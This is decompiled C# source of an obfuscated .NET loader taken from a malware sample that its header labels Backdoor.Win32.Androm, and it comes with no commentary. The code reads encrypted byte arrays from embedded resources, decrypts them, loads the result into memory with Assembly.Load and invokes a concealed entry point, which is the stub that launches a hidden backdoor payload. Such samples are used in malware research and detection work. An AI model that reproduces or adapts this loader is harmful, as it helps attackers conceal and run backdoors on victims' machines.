// Decompiled with JetBrains decompiler
// Type: 
// Assembly: mlw, Version=5.4.2.6, Culture=neutral, PublicKeyToken=null
// MVID: 968ED84C-4CC9-4699-A4B5-2702B06E186C
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00004-msil\Backdoor.Win32.Androm.hdnr-92392a61ec8326d02c20375aa31b3fc87adc2e038afd55b96dedff4b65022267.exe

using Microsoft.VisualBasic.CompilerServices;
using System;
using System.IO;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.Serialization.Formatters.Binary;
using System.Threading;

public sealed class \u0008
{
  public static byte[] \u0002(object _param0)
  {
    try
    {
      MemoryStream serializationStream = new MemoryStream();
      new BinaryFormatter().Serialize((Stream) serializationStream, RuntimeHelpers.GetObjectValue(_param0));
      return serializationStream.ToArray();
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      Exception exception = ex;
      Console.WriteLine(\u000F.\u0002(580699096), (object) exception.ToString());
      ProjectData.ClearProjectError();
    }
    return (byte[]) null;
  }

  public static object \u0002()
  {
    \u000E.\u0006 = \u0006.\u0002((byte[]) NewLateBinding.LateIndexGet(\u000E.\u0002.GetObject(\u000F.\u0002(580699127)), new object[1]
    {
      (object) 1
    }, (string[]) null), \u000F.\u0002(580699037));
    object obj;
    return obj;
  }

  [STAThread]
  public static void \u0002()
  {
    Thread.Sleep(0);
    \u0008.\u0002();
    Assembly.Load(\u000E.\u0006).GetType(\u0006.\u0002(\u000F.\u0002(580699019), \u000F.\u0002(580699062))).GetMethod(\u0006.\u0002(\u000F.\u0002(580699051), \u000F.\u0002(580698966))).Invoke((object) null, new object[2]
    {
      (object) \u0006.\u0002((byte[]) NewLateBinding.LateIndexGet(\u000E.\u0002.GetObject(\u000F.\u0002(580699127)), new object[1]
      {
        (object) 0
      }, (string[]) null), \u000F.\u0002(580698955)),
      (object) \u000E.\u0008
    });
  }
}
